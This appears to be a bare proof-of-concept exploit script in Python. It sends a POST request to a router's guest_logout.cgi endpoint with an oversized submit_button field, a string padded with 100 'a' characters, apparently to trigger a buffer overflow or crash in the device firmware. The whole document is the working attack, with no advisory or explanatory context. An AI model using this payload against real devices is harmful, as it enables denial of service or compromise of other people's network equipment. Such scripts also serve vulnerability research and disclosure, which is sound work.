import requests
from pwn import *

url = "https://192.168.1.1/guest_logout.cgi"
ip = "192.168.1.101"
payload = "status_guestnet.asp"
payload += 'a'*100

payload = {"cmac":"12:af:aa:bb:cc:dd","submit_button":payload,"cip":ip}

requests.post(url, data=payload, verify=False, timeout=1)
